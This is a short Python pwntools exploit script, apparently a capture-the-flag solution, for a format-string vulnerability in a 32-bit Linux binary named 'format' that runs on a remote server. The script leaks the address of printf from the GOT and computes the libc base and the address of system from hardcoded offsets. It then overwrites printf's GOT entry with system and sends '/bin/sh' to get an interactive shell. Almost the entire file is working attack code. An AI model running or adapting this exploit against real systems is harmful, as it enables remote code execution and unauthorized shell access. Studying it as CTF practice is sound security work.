#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 0
context(log_level="debug", arch="i386", os="linux")
if debug == 1:
    p = process('./format')
    libc = ELF('/lib/i386-linux-gnu/libc.so.6', checksec=False)
elif debug == 0:
    p = remote('117.139.247.14', 9309)
elf = ELF('./format', checksec=False)
# gdb.attach(p, "b *0x08048589\nc\nsi")
got_printf = elf.got['printf']

p.recvuntil('TERM environment variable not set.\n')
# 这块用got_printf和got_setbuf测出libc版本
# addr_printf后三位为0x020，addr_setbuf后三位为0x450
# 得到的libc为libc6-i386_2.23-0ubuntu10_amd64
pd = p32(elf.got['printf']) + "%7$s"
p.sendline(pd)
p.recv(4)
addr_printf = u32(p.recv(4))
libcbase = addr_printf - 0x049020
addr_system = libcbase + 0x03a940
pd = fmtstr_payload(7, {got_printf: addr_system})
p.sendline(pd)
success('addr_printf = ' + hex(addr_printf))
success('addr_system = ' + hex(addr_system))
p.sendline("/bin/sh\x00")
p.interactive()
